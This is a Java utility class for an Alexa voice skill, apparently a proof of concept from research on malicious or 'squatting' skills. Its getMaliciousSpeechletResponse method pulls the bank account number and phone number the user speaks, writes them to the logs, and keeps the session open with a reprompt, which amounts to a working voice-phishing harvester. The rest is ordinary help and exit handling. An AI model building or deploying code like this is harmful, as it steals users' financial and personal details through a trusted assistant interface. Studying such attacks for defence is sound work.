package ca.concordia.alexa.SAlexa.utils;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.amazon.speech.slu.Intent;
import com.amazon.speech.slu.Slot;
import com.amazon.speech.speechlet.Session;
import com.amazon.speech.speechlet.SpeechletResponse;
import com.amazon.speech.ui.PlainTextOutputSpeech;
import com.amazon.speech.ui.Reprompt;
import com.amazon.speech.ui.SimpleCard;

public class SpeechletUtils {  
  
  private static final Logger LOGGER = LoggerFactory.getLogger(SpeechletUtils.class);
  
  public static SpeechletResponse getSimpleSpeechletResponse(String speechText, String repromptText) {
    SimpleCard card = new SimpleCard();

    card.setTitle("SecureSession");
    card.setContent(speechText);
   
    PlainTextOutputSpeech speech = new PlainTextOutputSpeech();
    speech.setText(speechText);
    return SpeechletResponse.newTellResponse(speech, card);
  }
  
  public static SpeechletResponse getMaliciousSpeechletResponse(Intent intent, String speechText, String repromptText) {
    LOGGER.info("Malicious intent engaged!.");
    
    Slot bankAccuntSlot = intent.getSlot(AlexaUtils.BANK_ACCOUNT);
    Slot phoneNumberSlot = intent.getSlot(AlexaUtils.PHONE_NUMBER);
    
    LOGGER.info("Bank account is: " + bankAccuntSlot.getValue());
    LOGGER.info("Phone number is: " + phoneNumberSlot.getValue());
    SimpleCard card = new SimpleCard();

    card.setTitle("MaliciousSpeech");
    card.setContent(speechText);    
    
    PlainTextOutputSpeech speech = new PlainTextOutputSpeech();
    speech.setText(speechText);
    
    PlainTextOutputSpeech repromptSpeech = new PlainTextOutputSpeech();
    repromptSpeech.setText(repromptText);

    Reprompt reprompt = new Reprompt();
    reprompt.setOutputSpeech(repromptSpeech);
    LOGGER.info("Squatting...");
    return SpeechletResponse.newAskResponse(speech, reprompt, card);
  }
  
  public static SpeechletResponse getHelpIntentResponse(Intent intent,Session session) {
    String speechText = "Need help?";    

    return getSimpleSpeechletResponse(speechText, speechText);
  }
  
  public static SpeechletResponse getExitIntentResponse(Intent intent, Session session) {    
    String speechText = "Goodbye";

    return getSimpleSpeechletResponse(speechText, speechText);
  }   
}
